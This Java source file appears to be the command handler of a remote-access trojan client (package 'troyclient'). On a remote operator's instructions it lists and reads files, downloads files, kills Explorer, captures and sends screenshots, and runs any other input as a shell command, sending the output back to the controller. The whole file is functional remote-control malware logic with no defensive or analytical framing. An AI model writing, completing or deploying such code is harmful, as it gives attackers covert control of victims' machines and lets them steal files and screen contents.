package ch.lebois.troyclient.main;

import ch.lebois.troyclient.chat.Chat;
import ch.lebois.troyclient.functions.Screenshot;
import ch.lebois.troyclient.service.BonziFunctions;
import ch.lebois.troyclient.service.Console;
import ch.lebois.troyclient.service.DownloadService;
import ch.lebois.troyclient.service.FileService;
import ch.lebois.troyclient.service.ImageSender;
import ch.lebois.troyclient.service.ListFiles;

/**
 * @author Felix
 * @date 13.03.2018
 * <p>
 * Project: Hermann
 * Package: ch.lebois.troyclient.main
 **/
public class CommandList {

    private Command message = new Command("msg") {
        @Override
        public void run(String command) {
            Chat chat = Chat.getInstance();
            chat.addMessage("Hermann: " + command.substring(6));
            Console.execute(command);
            GetContext.SENDER.send("message", "CHAT - Hermann: " + command.substring(6));
        }
    };

    private Command ls = new Command("ls") {
        @Override
        public void run(String command) {
            GetContext.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
            new ListFiles().listFiles(command);
        }
    };

    private Command read = new Command("read") {
        @Override
        public void run(String command) {
            GetContext.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
            FileService.readFile(command);
        }
    };

    private Command download = new Command("download") {
        @Override
        public void run(String command) {
            new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
        }
    };

    private Command desktop = new Command("desktop") {
        @Override
        public void run(String command) {
            new BonziFunctions().showDesktop();
        }
    };

    private Command kill = new Command("kill") {
        @Override
        public void run(String command) {
            new BonziFunctions().killExplorer();
        }
    };

    private Command screenshot = new Command("screenshot") {
        @Override
        public void run(String command) {
            GetContext.SENDER.send("commandout", "Sending Img");
            new ImageSender().sendBytes(new Screenshot().takeScreenshot());
        }
    };


    public void readCommand(String command) {
        if (command.startsWith(message.getCommand())) {
            message.run(command);
        } else if (command.startsWith(ls.getCommand())) {
            ls.run(command);
        } else if (command.startsWith(read.getCommand())) {
            read.run(command);
        } else if (command.startsWith(download.getCommand())) {
            download.run(command);
        } else if (command.startsWith(desktop.getCommand())) {
            desktop.run(command);
        } else if (command.startsWith(kill.getCommand())) {
            kill.run(command);
        } else if (command.startsWith(screenshot.getCommand())) {
            screenshot.run(command);
        } else {
            executeNormalCommand(command);
        }
    }

    private void executeNormalCommand(String command) {
        try {
            if (!command.equals("")) {
                for (String out : Console.execute(command)) {
                    GetContext.SENDER.send("commandout", out);
                }
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
            GetContext.SENDER.send("errorout", "No command '" + command + "' found");
        }
    }

}
